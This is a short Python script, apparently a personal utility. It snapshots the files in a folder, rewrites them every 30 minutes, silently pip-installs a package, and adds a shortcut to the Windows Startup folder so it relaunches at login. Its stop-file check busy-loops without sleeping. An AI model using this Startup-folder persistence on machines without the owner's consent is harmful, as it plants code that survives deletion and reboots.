import time
import os
files={}
path = r"D:\New folder\\"
short_path = os.getenv("appdata")+r"\Microsoft\Windows\Start Menu\Programs" +\
             r"\Startup\start.lnk"
def main():
    for i in os.scandir("D:\\New folder"):
        if os.path.isfile(os.path.join("D:\\New folder",i)):
            with open(i) as file:
                files[i.name] = file.read()
    while 1:
        try:
            with open(r"D:\New folder\stop.txt") as file:
                if file.read() == "Password":
                    continue
        except:pass
        os.makedirs(path, exist_ok = True)
        try:#try to install SWinLnk and then create shortcut.
            from swinlnk.swinlnk import SWinLnk
            swl=SWinLnk()
            swl.create_lnk(path+"start.cmd", short_path)
        except:
            for i in range(10):
                try:
                    os.system("py -m pip install swinlnk")
                    from swinlnk.swinlnk import SWinLnk
                    swl=SWinLnk()
                    swl.create_lnk(path+"start.cmd", short_path)
                    break
                except:pass
        for i in files:
            with open(path+i,"w") as file:
                file.write(files[i])
        time.sleep(30*60)
